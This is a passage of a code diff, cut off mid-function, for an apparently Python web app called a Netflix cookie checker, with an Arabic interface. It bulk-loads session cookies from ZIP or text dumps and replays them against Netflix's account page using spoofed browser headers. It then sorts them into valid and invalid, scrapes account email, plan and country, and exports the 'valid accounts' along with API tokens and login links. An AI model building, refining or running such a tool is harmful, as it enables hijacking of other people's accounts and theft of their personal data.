@@ -11,81 +11,56 @@ HTML = r'''
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Netflix Cookie Checker Pro</title>
+    <title>Netflix Checker – النسخة المستقرة</title>
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap" rel="stylesheet">
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
     <style>
-        :root {
-            --bg:#0f0f0f; --card:#1e1e1e; --input:#252525; --red:#e50914;
-            --green:#2ecc71; --yellow:#f39c12; --blue:#3498db; --white:#fff;
-            --text2:#b3b3b3; --border:#333; --radius:14px;
-        }
+        :root { --bg:#0f0f0f; --card:#1e1e1e; --input:#252525; --red:#e50914; --green:#2ecc71; --yellow:#f39c12; --white:#fff; --text2:#b3b3b3; --border:#333; --radius:12px; }
         * { margin:0; padding:0; box-sizing:border-box; }
         body { font-family:'Cairo',sans-serif; background:var(--bg); color:var(--white); padding:20px; }
-        .container { max-width:1100px; margin:auto; }
-        .logo { text-align:center; font-size:3.5em; font-weight:900; color:var(--red); letter-spacing:6px; margin-bottom:10px; }
-        h1 { text-align:center; background:linear-gradient(135deg,var(--red),#f40612); -webkit-background-clip:text; -webkit-text-fill-color:transparent; }
-        .sub { color:var(--text2); text-align:center; margin-bottom:20px; }
-        .stats { display:grid; grid-template-columns:repeat(auto-fit,minmax(130px,1fr)); gap:12px; margin:20px 0; }
-        .stat { background:var(--card); border:1px solid var(--border); border-radius:var(--radius); padding:15px; text-align:center; }
-        .stat-icon { font-size:2em; }
-        .stat-val { font-size:2em; font-weight:900; }
-        .stat-label { color:var(--text2); font-size:0.8em; }
-        .section { background:var(--card); border:1px solid var(--border); border-radius:var(--radius); padding:20px; margin:20px 0; }
-        .two-cols { display:grid; grid-template-columns:1fr 1fr; gap:20px; }
-        @media (max-width:768px) { .two-cols { grid-template-columns:1fr; } }
+        .container { max-width:1000px; margin:auto; }
+        .logo { text-align:center; font-size:3em; font-weight:900; color:var(--red); letter-spacing:5px; }
+        h1 { text-align:center; color:var(--white); }
+        .two-cols { display:grid; grid-template-columns:1fr 1fr; gap:20px; margin:20px 0; }
+        @media(max-width:700px){ .two-cols{grid-template-columns:1fr;} }
         .upload-area {
-            border:2px dashed var(--border); border-radius:var(--radius); padding:30px 20px;
-            text-align:center; background:var(--input); cursor:pointer; transition:all 0.3s;
-            min-height:180px; display:flex; flex-direction:column; justify-content:center; align-items:center;
+            border:2px dashed var(--border); border-radius:var(--radius); padding:30px; text-align:center;
+            background:var(--input); cursor:pointer; min-height:160px; display:flex; flex-direction:column; justify-content:center;
         }
-        .upload-area:hover, .upload-area.dragover { border-color:var(--red); background:rgba(229,9,20,0.05); }
+        .upload-area:hover, .upload-area.dragover { border-color:var(--red); }
         textarea {
-            width:100%; height:180px; background:var(--input); border:1px solid var(--border);
-            border-radius:var(--radius); color:var(--white); padding:15px; font-family:monospace;
-            direction:ltr; resize:vertical;
+            width:100%; height:160px; background:var(--input); border:1px solid var(--border);
+            border-radius:var(--radius); color:var(--white); padding:12px; font-family:monospace; direction:ltr;
         }
-        textarea:focus { outline:none; border-color:var(--red); }
-        .btn {
-            padding:12px 25px; border:none; border-radius:8px; font-weight:700; cursor:pointer;
-            color:var(--white); font-family:'Cairo'; transition:all 0.3s; font-size:0.95em;
-            display:inline-flex; align-items:center; gap:6px;
-        }
+        .btn { padding:10px 20px; border:none; border-radius:6px; font-weight:700; cursor:pointer; color:var(--white); }
         .btn-primary { background:var(--red); }
         .btn-success { background:var(--green); }
         .btn-warning { background:#e67e22; }
         .btn-danger { background:#c0392b; }
-        .btn-outline { background:transparent; border:2px solid var(--red); color:var(--red); }
-        .btn-outline:hover { background:var(--red); color:var(--white); }
-        .btn:disabled { opacity:0.5; cursor:not-allowed; }
-        .progress { display:none; margin:15px 0; }
-        .progress-bar { height:8px; background:var(--input); border-radius:4px; overflow:hidden; }
-        .progress-fill { height:100%; background:var(--red); width:0%; transition:width 0.3s; }
-        .progress-text { text-align:center; color:var(--text2); margin-top:5px; }
-        .filter-bar { display:flex; gap:8px; flex-wrap:wrap; margin:15px 0; }
-        .filter-btn { padding:6px 15px; border:1px solid var(--border); border-radius:20px; background:transparent; color:var(--text2); cursor:pointer; font-size:0.8em; }
-        .filter-btn.active, .filter-btn:hover { background:var(--red); color:var(--white); border-color:var(--red); }
-        .result-card { background:var(--card); border:1px solid var(--border); border-radius:var(--radius); margin-bottom:12px; overflow:hidden; }
-        .result-header { padding:15px; display:flex; justify-content:space-between; align-items:center; cursor:pointer; }
-        .badge { padding:5px 12px; border-radius:20px; font-size:0.8em; font-weight:700; }
+        .btn:disabled { opacity:0.5; }
+        .stats { display:grid; grid-template-columns:repeat(auto-fit,minmax(100px,1fr)); gap:8px; margin:15px 0; }
+        .stat { background:var(--card); border:1px solid var(--border); border-radius:8px; padding:10px; text-align:center; }
+        .stat-icon { font-size:1.6em; }
+        .stat-val { font-size:1.8em; font-weight:900; }
+        .stat-label { color:var(--text2); font-size:0.7em; }
+        .result-card { background:var(--card); border:1px solid var(--border); border-radius:8px; margin:8px 0; }
+        .result-header { padding:12px; display:flex; justify-content:space-between; cursor:pointer; }
+        .badge { padding:4px 10px; border-radius:12px; font-size:0.75em; font-weight:700; }
         .badge-valid { background:rgba(46,204,113,0.15); color:var(--green); }
         .badge-invalid { background:rgba(229,9,20,0.15); color:var(--red); }
         .badge-error { background:rgba(243,156,18,0.15); color:var(--yellow); }
-        .result-body { display:none; padding:0 15px 15px; }
+        .result-body { display:none; padding:0 12px 12px; }
         .result-body.show { display:block; }
-        .cookie-box { background:var(--input); padding:10px; border-radius:6px; font-family:monospace; direction:ltr; word-break:break-all; margin:8px 0; }
-        .detail-grid { display:grid; grid-template-columns:repeat(auto-fit,minmax(140px,1fr)); gap:8px; margin:10px 0; }
-        .detail-item { background:var(--input); padding:10px; border-radius:6px; text-align:center; }
-        .detail-label { color:var(--text2); font-size:0.75em; }
-        .detail-value { font-weight:700; }
-        .token-section { background:var(--input); border-radius:8px; padding:12px; margin-top:10px; }
-        .links-grid { display:grid; grid-template-columns:repeat(auto-fit,minmax(180px,1fr)); gap:8px; margin-top:10px; }
-        .link-card { background:var(--card); border:1px solid var(--border); border-radius:8px; padding:10px; text-align:center; }
-        .link-icon { font-size:1.8em; }
-        .copy-btn, .open-btn { padding:5px 12px; border:none; border-radius:6px; cursor:pointer; font-weight:600; margin:3px; font-family:'Cairo'; }
+        .cookie-box { background:var(--input); padding:8px; border-radius:4px; font-family:monospace; direction:ltr; word-break:break-all; }
+        .detail-grid { display:grid; grid-template-columns:repeat(auto-fit,minmax(120px,1fr)); gap:6px; margin:8px 0; }
+        .detail-item { background:var(--input); padding:8px; border-radius:4px; text-align:center; }
+        .token-section { background:var(--input); border-radius:6px; padding:10px; margin-top:8px; }
+        .links-grid { display:grid; grid-template-columns:repeat(auto-fit,minmax(160px,1fr)); gap:6px; margin-top:8px; }
+        .link-card { background:var(--card); border:1px solid var(--border); border-radius:6px; padding:8px; text-align:center; }
+        .copy-btn, .open-btn { padding:4px 10px; border:none; border-radius:4px; cursor:pointer; font-weight:600; margin:2px; }
         .copy-btn { background:var(--green); color:var(--white); }
         .open-btn { background:var(--red); color:var(--white); }
-        .toast { position:fixed; top:20px; left:50%; transform:translateX(-50%); padding:12px 30px; border-radius:8px; color:var(--white); font-weight:700; z-index:9999; }
+        .toast { position:fixed; top:15px; left:50%; transform:translateX(-50%); padding:10px 25px; border-radius:6px; color:var(--white); font-weight:700; z-index:9999; }
         .toast-success { background:var(--green); }
         .toast-error { background:var(--red); }
         .toast-info { background:var(--blue); }
@@ -94,386 +69,243 @@ HTML = r'''
 <body>
     <div class="container">
         <div class="logo">NETFLIX</div>
-        <h1>🔍 فاحص الكوكيز المتكامل</h1>
-        <div class="sub">ارفع ملفات ZIP تحتوي على كوكيز، أو الصقها يدوياً</div>
-
+        <h1>🔍 فاحص الكوكيز الاحترافي</h1>
+        <div class="two-cols">
+            <div>
+                <div style="font-weight:700; margin-bottom:8px;">📁 رفع ملف ZIP</div>
+                <div class="upload-area" id="uploadArea">
+                    <div style="font-size:2em">📤</div>
+                    <div>اسحب ملف ZIP هنا</div>
+                    <div style="color:var(--text2); font-size:0.7em;">يستخرج الكوكيز تلقائياً</div>
+                </div>
+                <input type="file" id="fileInput" accept=".zip,.txt,.csv" multiple style="display:none">
+            </div>
+            <div>
+                <div style="font-weight:700; margin-bottom:8px;">📋 لصق الكوكيز</div>
+                <textarea id="cookieTextarea" placeholder="الصق الكوكيز هنا..."></textarea>
+            </div>
+        </div>
+        <div style="text-align:center; margin:15px 0;">
+            <button class="btn btn-primary" id="btnCheck" onclick="startCheck()">🚀 ابدأ الفحص</button>
+            <button class="btn btn-danger" id="btnStop" onclick="stopCheck()" style="display:none;">⏹️ إيقاف</button>
+            <button class="btn btn-success" id="btnDownloadValid" disabled onclick="downloadValid()">💾 تحميل الصالحة</button>
+            <button class="btn btn-warning" onclick="clearAll()">🗑️ مسح</button>
+        </div>
+        <div id="progress" style="display:none; margin:10px 0;">
+            <div style="height:6px; background:var(--input); border-radius:3px;"><div id="progressFill" style="height:100%; background:var(--red); width:0%;"></div></div>
+            <div id="progressText" style="text-align:center; color:var(--text2); font-size:0.8em;"></div>
+        </div>
         <div class="stats">
             <div class="stat"><div class="stat-icon">📝</div><div class="stat-val" id="statTotal" style="color:var(--blue)">0</div><div class="stat-label">الإجمالي</div></div>
             <div class="stat"><div class="stat-icon">✅</div><div class="stat-val" id="statValid" style="color:var(--green)">0</div><div class="stat-label">صالحة</div></div>
             <div class="stat"><div class="stat-icon">❌</div><div class="stat-val" id="statInvalid" style="color:var(--red)">0</div><div class="stat-label">غير صالحة</div></div>
             <div class="stat"><div class="stat-icon">⚠️</div><div class="stat-val" id="statErrors" style="color:var(--yellow)">0</div><div class="stat-label">أخطاء</div></div>
-            <div class="stat"><div class="stat-icon">⚡</div><div class="stat-val" id="statSpeed">0s</div><div class="stat-label">الوقت</div></div>
-        </div>
-
-        <div class="section">
-            <div class="two-cols">
-                <!-- عمود رفع الملفات المضغوطة -->
-                <div>
-                    <div style="font-weight:700; margin-bottom:10px;">📁 رفع ملفات ZIP</div>
-                    <div class="upload-area" id="uploadArea">
-                        <div style="font-size:2.5em">📤</div>
-                        <div>اسحب وأفلت ملف ZIP هنا</div>
-                        <div style="color:var(--text2); font-size:0.8em;">يتم استخراج الكوكيز من جميع الملفات النصية</div>
-                    </div>
-                    <input type="file" id="fileInput" accept=".zip,.txt,.csv" multiple style="display:none">
-                </div>
-                <!-- عمود اللصق اليدوي -->
-                <div>
-                    <div style="font-weight:700; margin-bottom:10px;">📋 لصق الكوكيز يدوياً</div>
-                    <textarea id="cookieTextarea" placeholder="الصق الكوكيز هنا...\nكل كوكيز في سطر منفصل"></textarea>
-                </div>
-            </div>
-            <div style="text-align:center; margin-top:15px; display:flex; gap:10px; justify-content:center; flex-wrap:wrap;">
-                <button class="btn btn-primary" id="btnCheck" onclick="startCheck()">🚀 ابدأ الفحص</button>
-                <button class="btn btn-danger" id="btnStop" onclick="stopCheck()" style="display:none;">⏹️ إيقاف الفحص</button>
-                <button class="btn btn-success" id="btnDownloadValid" disabled onclick="downloadValid()">💾 تحميل الحسابات الصالحة</button>
-                <button class="btn btn-warning" onclick="clearAll()">🗑️ مسح الكل</button>
-            </div>
-            <div class="progress" id="progressContainer">
-                <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
-                <div class="progress-text" id="progressText"></div>
-            </div>
-        </div>
-
-        <div class="filter-bar">
-            <button class="filter-btn active" onclick="setFilter('all')">الكل</button>
-            <button class="filter-btn" onclick="setFilter('valid')">✅ صالحة</button>
-            <button class="filter-btn" onclick="setFilter('invalid')">❌ غير صالحة</button>
-            <button class="filter-btn" onclick="setFilter('error')">⚠️ أخطاء</button>
         </div>
         <div id="resultsList"></div>
     </div>
-
     <script>
-        let allCookies = [];            // {cookie, source}
-        let allResults = [];
-        let currentFilter = 'all';
-        let abortController = null;
-        let isChecking = false;
+        let allCookies = [], allResults = [], abortController = null, isChecking = false;
+        const uploadArea = document.getElementById('uploadArea'), fileInput = document.getElementById('fileInput'),
+              cookieTextarea = document.getElementById('cookieTextarea'), btnCheck = document.getElementById('btnCheck'),
+              btnStop = document.getElementById('btnStop'), btnDownloadValid = document.getElementById('btnDownloadValid');
 
-        const uploadArea = document.getElementById('uploadArea');
-        const fileInput = document.getElementById('fileInput');
-        const cookieTextarea = document.getElementById('cookieTextarea');
-        const btnCheck = document.getElementById('btnCheck');
-        const btnStop = document.getElementById('btnStop');
-        const btnDownloadValid = document.getElementById('btnDownloadValid');
-
-        // --- رفع الملفات واستخراج الكوكيز من ZIP ---
-        uploadArea.addEventListener('click', ()=> fileInput.click());
-        uploadArea.addEventListener('dragover', e=> { e.preventDefault(); uploadArea.classList.add('dragover'); });
-        uploadArea.addEventListener('dragleave', ()=> uploadArea.classList.remove('dragover'));
-        uploadArea.addEventListener('drop', e=> {
-            e.preventDefault();
-            uploadArea.classList.remove('dragover');
-            handleFiles(e.dataTransfer.files);
-        });
-        fileInput.addEventListener('change', e=> handleFiles(e.target.files));
+        uploadArea.addEventListener('click',()=>fileInput.click());
+        uploadArea.addEventListener('dragover',e=>{e.preventDefault();uploadArea.classList.add('dragover');});
+        uploadArea.addEventListener('dragleave',()=>uploadArea.classList.remove('dragover'));
+        uploadArea.addEventListener('drop',e=>{e.preventDefault();uploadArea.classList.remove('dragover');handleFiles(e.dataTransfer.files);});
+        fileInput.addEventListener('change',e=>handleFiles(e.target.files));
 
         async function handleFiles(files) {
-            let count = 0;
-            for (let file of files) {
-                if (file.name.endsWith('.zip')) {
-                    try {
+            for(let file of files){
+                if(file.name.endsWith('.zip')){
+                    try{
                         const zip = await JSZip.loadAsync(file);
-                        for (let [filename, zipEntry] of Object.entries(zip.files)) {
-                            if (!zipEntry.dir && (filename.endsWith('.txt') || filename.endsWith('.csv'))) {
-                                const content = await zipEntry.async('string');
-                                const lines = content.split('\n').map(l=>l.trim()).filter(l=> l && l.includes('='));
-                                lines.forEach(c => allCookies.push({ cookie: c, source: filename }));
-                                count += lines.length;
+                        for(let [name,entry] of Object.entries(zip.files)){
+                            if(!entry.dir && (name.endsWith('.txt')||name.endsWith('.csv'))){
+                                const text = await entry.async('string');
+                                text.split('\n').map(l=>l.trim()).filter(l=>l&&l.includes('=')).forEach(c=>allCookies.push(c));
                             }
                         }
-                        showToast(`✅ تم استخراج ${count} كوكيز من ${file.name}`, 'success');
-                    } catch (err) {
-                        showToast(`❌ خطأ في قراءة ZIP: ${err.message}`, 'error');
-                    }
-                } else if (file.name.endsWith('.txt') || file.name.endsWith('.csv')) {
-                    const content = await file.text();
-                    const lines = content.split('\n').map(l=>l.trim()).filter(l=> l && l.includes('='));
-                    lines.forEach(c => allCookies.push({ cookie: c, source: file.name }));
-                    count += lines.length;
-                    showToast(`✅ تم تحميل ${lines.length} كوكيز من ${file.name}`, 'success');
+                    }catch(e){}
+                }else if(file.name.endsWith('.txt')||file.name.endsWith('.csv')){
+                    const text = await file.text();
+                    text.split('\n').map(l=>l.trim()).filter(l=>l&&l.includes('=')).forEach(c=>allCookies.push(c));
                 }
             }
-            if (count > 0) {
-                showToast(`📦 إجمالي الكوكيز المحملة: ${allCookies.length}`, 'info');
-            }
+            if(allCookies.length) showToast(`📦 تم تحميل ${allCookies.length} كوكيز`,'info');
         }
 
-        // --- دمج الكوكيز من الملفات واللصق اليدوي ---
-        function collectAllCookies() {
-            const manualText = cookieTextarea.value.trim();
-            const manualCookies = manualText ? manualText.split('\n').map(l=>l.trim()).filter(l=> l && l.includes('=')) : [];
-            const fileCookies = allCookies.map(c => c.cookie);
-            // إزالة التكرارات
-            const allUnique = [...new Set([...fileCookies, ...manualCookies])];
-            return allUnique.map(c => ({ cookie: c, source: 'manual' }));
+        function collectAllCookies(){
+            const manual = cookieTextarea.value.trim().split('\n').map(l=>l.trim()).filter(l=>l&&l.includes('='));
+            return [...new Set([...allCookies, ...manual])];
         }
 
-        // --- بدء / إيقاف الفحص ---
-        async function startCheck() {
+        async function startCheck(){
             const cookies = collectAllCookies();
-            if (cookies.length === 0) {
-                showToast('❌ لا توجد كوكيز لفحصها. ارفع ملف ZIP أو الصق كوكيز.', 'error');
-                return;
-            }
-
-            if (isChecking) return;
-            isChecking = true;
-            abortController = new AbortController();
-            const signal = abortController.signal;
-
-            btnCheck.style.display = 'none';
-            btnStop.style.display = 'inline-flex';
-            document.getElementById('progressContainer').style.display = 'block';
+            if(!cookies.length) return showToast('لا توجد كوكيز','error');
+            isChecking = true; abortController = new AbortController(); signal = abortController.signal;
+            btnCheck.style.display='none'; btnStop.style.display='inline-flex';
+            document.getElementById('progress').style.display='block';
             document.getElementById('resultsList').innerHTML = '';
-            allResults = [];
-            const startTime = Date.now();
-            const total = cookies.length;
-            let processed = 0;
-            const batchSize = 15;
-
-            for (let i = 0; i < total; i += batchSize) {
-                if (signal.aborted) break;
-
-                const batch = cookies.slice(i, i+batchSize).map(c => c.cookie).join('\n');
-                try {
-                    const resp = await fetch('/check_multiple', {
-                        method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({cookies: batch}),
-                        signal: signal
-                    });
+            allResults = []; const start = Date.now(); const total = cookies.length;
+            let processed = 0; const batchSize = 15;
+            for(let i=0;i<total;i+=batchSize){
+                if(signal.aborted) break;
+                const batch = cookies.slice(i,i+batchSize).join('\n');
+                try{
+                    const resp = await fetch('/check',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cookies:batch}),signal});
                     const data = await resp.json();
-                    if (data.results) {
-                        data.results.forEach((r, idx) => { r.sourceFile = 'upload'; });
-                        allResults.push(...data.results);
-                    }
-                } catch(e) {
-                    if (e.name === 'AbortError') break;
-                    for (let j = i; j < Math.min(i+batchSize, total); j++) {
-                        allResults.push({
-                            status:'error', message:'فشل الاتصال',
-                            cookie: cookies[j].cookie,
-                            sourceFile: 'upload',
-                            timestamp: new Date().toLocaleString()
-                        });
-                    }
-                }
-                processed = Math.min(i+batchSize, total);
-                const pct = Math.round(processed/total*100);
-                document.getElementById('progressFill').style.width = pct+'%';
-                document.getElementById('progressText').textContent = `فحص ${processed}/${total}`;
-                renderResults();
-                updateStats();
+                    if(data.results) allResults.push(...data.results);
+                }catch(e){if(e.name==='AbortError')break;}
+                processed = Math.min(i+batchSize,total);
+                document.getElementById('progressFill').style.width = (processed/total*100)+'%';
+                document.getElementById('progressText').textContent = `${processed}/${total}`;
+                renderResults(); updateStats();
             }
-
-            document.getElementById('statSpeed').textContent = ((Date.now()-startTime)/1000).toFixed(2)+'s';
-            document.getElementById('progressContainer').style.display = 'none';
-            btnCheck.style.display = 'inline-flex';
-            btnStop.style.display = 'none';
-            btnDownloadValid.disabled = (allResults.filter(r=>r.status==='valid').length === 0);
-            isChecking = false;
-            updateStats();
-            renderResults();
-            showToast(signal.aborted ? '⏹️ تم إيقاف الفحص' : `✅ تم فحص ${total} كوكيز`, signal.aborted ? 'info' : 'success');
+            document.getElementById('progress').style.display='none';
+            btnCheck.style.display='inline-flex'; btnStop.style.display='none';
+            btnDownloadValid.disabled = !allResults.some(r=>r.status==='valid');
+            isChecking = false; updateStats(); renderResults();
+            showToast(signal.aborted?'⏹️ توقف':'✅ اكتمل', signal.aborted?'info':'success');
         }
+        function stopCheck(){if(abortController)abortController.abort();}
 
-        function stopCheck() {
-            if (abortController) abortController.abort();
-        }
-
-        // --- عرض النتائج ---
-        function renderResults() {
+        function renderResults(){
             const container = document.getElementById('resultsList');
-            let filtered = currentFilter==='all' ? allResults : allResults.filter(r=> r.status===currentFilter);
-            if (filtered.length === 0) {
-                container.innerHTML = '<div style="text-align:center;color:var(--text2);padding:30px;">لا توجد نتائج</div>';
-                return;
-            }
             const statusText = {valid:'✅ صالحة', invalid:'❌ غير صالحة', error:'⚠️ خطأ'};
-            container.innerHTML = filtered.map((r, idx) => {
-                const cls = 'badge-' + (r.status||'unknown');
-                const rid = 'res-'+idx+'-'+Date.now();
+            container.innerHTML = allResults.map((r,idx)=>{
+                const cls = 'badge-'+(r.status||'unknown');
                 let details = '';
-                if (r.details) {
+                if(r.details){
                     details = '<div class="detail-grid">';
-                    for (let [k,v] of Object.entries({membership:'📋 العضوية', plan:'💎 الباقة', country:'🌍 البلد', email:'📧 البريد'}))
-                        if (r.details[k] && r.details[k]!=='غير معروف') details += `<div class="detail-item"><div class="detail-label">${v}</div><div class="detail-value">${r.details[k]}</div></div>`;
+                    for(let [k,v] of Object.entries({membership:'العضوية',plan:'الباقة',country:'البلد',email:'البريد'}))
+                        if(r.details[k]) details += `<div class="detail-item"><small>${v}</small><br><strong>${r.details[k]}</strong></div>`;
                     details += '</div>';
                 }
-                const cookieText = r.cookie || '';
-                return `
-                <div class="result-card">
-                    <div class="result-header" onclick="this.nextElementSibling.classList.toggle('show')">
-                        <div style="display:flex; align-items:center; gap:10px; flex-wrap:wrap;">
-                            <span class="badge ${cls}">${statusText[r.status]||'❓'}</span>
-                            <span style="color:var(--text2);">#${idx+1}</span>
-                            <span>${r.message||''}</span>
-                        </div>
-                        <span>▼</span>
-                    </div>
-                    <div class="result-body">
-                        ${details}
-                        <div style="margin:8px 0;"><strong>🔒 الكوكيز:</strong>
-                            <div class="cookie-box">${escapeHtml(cookieText)}</div>
-                            <button class="copy-btn" onclick="copyText('${escapeQuotes(cookieText)}')">📋 نسخ الكوكيز</button>
-                        </div>
-                        ${r.api_tokens?.api_token ? `
-                        <div class="token-section">
-                            <strong>🔑 ApiToken</strong>
-                            <div style="background:#000;color:var(--green);padding:8px;border-radius:6px;font-family:monospace;word-break:break-all;margin:8px 0;">${r.api_tokens.api_token}</div>
-                            <button class="copy-btn" onclick="copyText('${escapeQuotes(r.api_tokens.api_token)}')">📋 نسخ ApiToken</button>
-                            <div class="links-grid">
-                                ${r.api_tokens.direct_links ? Object.entries(r.api_tokens.direct_links).map(([k,d]) => `
-                                    <div class="link-card">
-                                        <div class="link-icon">${d.name.split(' ')[0]}</div>
-                                        <div style="font-weight:700;">${d.name}</div>
-                                        <div style="margin:5px 0;">
-                                            <button class="open-btn" onclick="window.open('${d.url}')">🔗 فتح</button>
-                                            <button class="copy-btn" onclick="copyText('${escapeQuotes(d.url)}')">📋 نسخ</button>
-                                        </div>
-                                    </div>
-                                `).join('') : ''}
-                            </div>
-                        </div>` : ''}
-                        <div style="color:var(--text2); font-size:0.8em; margin-top:8px;">${r.timestamp||''}</div>
-                    </div>
-                </div>`;
+                const cookieText = r.cookie||'';
+                return `<div class="result-card"><div class="result-header" onclick="this.nextElementSibling.classList.toggle('show')"><div style="display:flex;align-items:center;gap:8px;"><span class="badge ${cls}">${statusText[r.status]||'؟'}</span><span>${r.message||''}</span></div><span>▼</span></div><div class="result-body">${details}<div class="cookie-box">${escapeHtml(cookieText)}</div><button class="copy-btn" onclick="navigator.clipboard.writeText('${escapeQuotes(cookieText)}')">📋 نسخ الكوكيز</button>${r.api_tokens?.api_token?`<div class="token-section"><strong>🔑 ApiToken</strong><div style="background:#000;color:var(--green);padding:6px;border-radius:4px;font-family:monospace;">${r.api_tokens.api_token}</div><button class="copy-btn" onclick="navigator.clipboard.writeText('${escapeQuotes(r.api_tokens.api_token)}')">📋 نسخ</button><div class="links-grid">${Object.entries(r.api_tokens.direct_links).map(([k,d])=>`<div class="link-card"><div>${d.name}</div><button class="open-btn" onclick="window.open('${d.url}')">🔗 فتح</button><button class="copy-btn" onclick="navigator.clipboard.writeText('${escapeQuotes(d.url)}')">📋 نسخ</button></div>`).join('')}</div></div>`:''}</div></div>`;
             }).join('');
         }
 
-        function escapeHtml(text) { return text.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
-        function escapeQuotes(text) { return text.replace(/'/g,"\\'").replace(/"/g,'&quot;'); }
-
-        function setFilter(f) {
-            currentFilter = f;
-            document.querySelectorAll('.filter-btn').forEach(b=>b.classList.remove('active'));
-            event.target.classList.add('active');
-            renderResults();
-        }
-
-        function updateStats() {
+        function escapeHtml(t){return t.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
+        function escapeQuotes(t){return t.replace(/'/g,"\\'").replace(/"/g,'&quot;');}
+        function updateStats(){
             document.getElementById('statTotal').textContent = allResults.length;
             document.getElementById('statValid').textContent = allResults.filter(r=>r.status==='valid').length;
             document.getElementById('statInvalid').textContent = allResults.filter(r=>r.status==='invalid').length;
             document.getElementById('statErrors').textContent = allResults.filter(r=>r.status==='error').length;
         }
-
-        function downloadValid() {
-            const valid = allResults.filter(r=> r.status==='valid');
-            if (!valid.length) return showToast('لا حسابات صالحة', 'error');
+        function downloadValid(){
+            const valid = allResults.filter(r=>r.status==='valid');
+            if(!valid.length) return;
             let txt = '═══ حسابات Netflix الصالحة ═══\n\n';
-            valid.forEach((r,i) => {
-                txt += `[${i+1}]\nالكوكيز: ${r.cookie||''}\n`;
-                if (r.details) {
-                    txt += `البريد: ${r.details.email||'?'}\nالعضوية: ${r.details.membership||'?'}\nالباقة: ${r.details.plan||'?'}\nالبلد: ${r.details.country||'?'}\n`;
-                }
-                if (r.api_tokens?.api_token) txt += `ApiToken: ${r.api_tokens.api_token}\n`;
-                if (r.api_tokens?.direct_links) {
-                    txt += `رابط كمبيوتر: ${r.api_tokens.direct_links.computer?.url||''}\nرابط جوال: ${r.api_tokens.direct_links.mobile?.url||''}\nرابط تلفاز: ${r.api_tokens.direct_links.tv?.url||''}\n`;
-                }
-                txt += '─'.repeat(40)+'\n';
+            valid.forEach((r,i)=>{
+                txt += `[${i+1}]\nالكوكيز: ${r.cookie}\n`;
+                if(r.details) txt += `البريد: ${r.details.email||''}\nالعضوية: ${r.details.membership||''}\n`;
+                if(r.api_tokens?.api_token) txt += `ApiToken: ${r.api_tokens.api_token}\n`;
+                txt += '─'.repeat(30)+'\n';
             });
-            const blob = new Blob(['\uFEFF'+txt], {type:'text/plain;charset=utf-8'});
-            const a = document.createElement('a'); a.href = URL.createObjectURL(blob); a.download = 'netflix_valid_accounts.txt'; a.click();
-            showToast('💾 تم التحميل', 'success');
+            const blob = new Blob([txt],{type:'text/plain'});
+            const a = document.createElement('a'); a.href=URL.createObjectURL(blob); a.download='netflix_valid.txt'; a.click();
         }
-
-        function copyText(text) { navigator.clipboard.writeText(text).then(()=> showToast('✅ تم النسخ','success')).catch(()=> showToast('❌ فشل','error')); }
-        function showToast(msg, type) { const t=document.createElement('div'); t.className=`toast toast-${type}`; t.textContent=msg; document.body.appendChild(t); setTimeout(()=>t.remove(),2500); }
-        function clearAll() {
-            allCookies = [];
-            allResults = [];
-            cookieTextarea.value = '';
-            document.getElementById('resultsList').innerHTML = '';
-            btnDownloadValid.disabled = true;
-            updateStats();
-            document.getElementById('statSpeed').textContent = '0s';
-            showToast('🗑️ تم مسح الكل', 'info');
+        function showToast(msg,type){const el=document.createElement('div');el.className=`toast toast-${type}`;el.textContent=msg;document.body.appendChild(el);setTimeout(()=>el.remove(),2000);}
+        function clearAll(){
+            allCookies=[]; allResults=[]; cookieTextarea.value=''; document.getElementById('resultsList').innerHTML='';
+            btnDownloadValid.disabled=true; updateStats();
         }
     </script>
 </body>
 </html>
 '''
 
-# ========== دالة الفحص المحسّنة ==========
+# ========== دالة الفحص الجديدة (موثوقة) ==========
 def check_cookie(cookie):
     try:
         sess = requests.Session()
         headers = {
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
-            'Accept-Language': 'en-US,en;q=0.9,ar;q=0.8',
-            'Referer': 'https://www.netflix.com/browse',
-            'Cookie': cookie
+            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Cookie': cookie,
         }
-        sess.get('https://www.netflix.com/browse', headers=headers, timeout=15)
-        time.sleep(random.uniform(0.2, 0.5))
-        r = sess.get('https://www.netflix.com/YourAccount', headers=headers, timeout=20, allow_redirects=True, max_redirects=5)
-        final_url = r.url
-        result = {
-            'status':'unknown', 'message':'', 'details':{}, 'api_tokens':{},
-            'cookie': cookie,
-            'timestamp':datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-        }
+        # زيارة الصفحة الرئيسية
+        r1 = sess.get('https://www.netflix.com/', headers=headers, timeout=15, allow_redirects=True)
+        time.sleep(random.uniform(0.3, 0.7))
+        # زيارة صفحة الحساب
+        r2 = sess.get('https://www.netflix.com/YourAccount', headers=headers, timeout=20, allow_redirects=True, max_redirects=5)
+        final_url = r2.url
+        result = {'status':'unknown','message':'','cookie':cookie,'details':{},'api_tokens':{}}
+
         if 'login' in final_url.lower():
             result['status'] = 'invalid'
             result['message'] = '❌ منتهية الصلاحية'
             return result
-        if r.status_code == 200:
-            text = r.text
-            if 'membershipStatus' in text:
-                mm = re.search(r'"membershipStatus"\s*:\s*"([^"]+)"', text)
-                pm = re.search(r'"planName"\s*:\s*"([^"]+)"', text)
-                cm = re.search(r'"countryOfSignup"\s*:\s*"([^"]+)"', text)
-                em = re.search(r'"email"\s*:\s*"([^"]+)"', text)
-                result['status'] = 'valid'
-                result['message'] = '✅ كوكيز صالحة'
-                result['details'] = {
